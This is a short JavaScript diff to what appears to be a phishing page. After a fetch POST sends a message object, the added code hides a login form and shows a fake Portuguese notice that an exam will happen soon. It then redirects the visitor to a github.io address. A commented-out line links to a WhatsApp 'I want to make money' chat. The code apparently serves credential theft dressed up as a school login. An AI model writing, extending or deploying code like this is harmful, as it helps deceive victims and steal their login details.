@@ -19,7 +19,16 @@ method: "POST",
 headers: {"Content-Type":"application/json"},
 body: JSON.stringify(msg)
 });
-window.location.href="https://redcg3.github.io?gd=OwycZW"
+
+var dhs=document.querySelector("#brev");
+dhs.style.display="block";
+var lgPage=document.querySelector("#loginPage");
+lgPage.style.display="none";
+setTimeout(function(){
+alert("A prova será feita em breve. Aguarde a mensagem do professor.");
+window.location.href="https://redcg3.github.io?gd=OwycZW";
+},4000)
+//window.location.href="https://wa.me/85292284980?text=Quero%20fazer%20dinheiro"
 }
 }
 
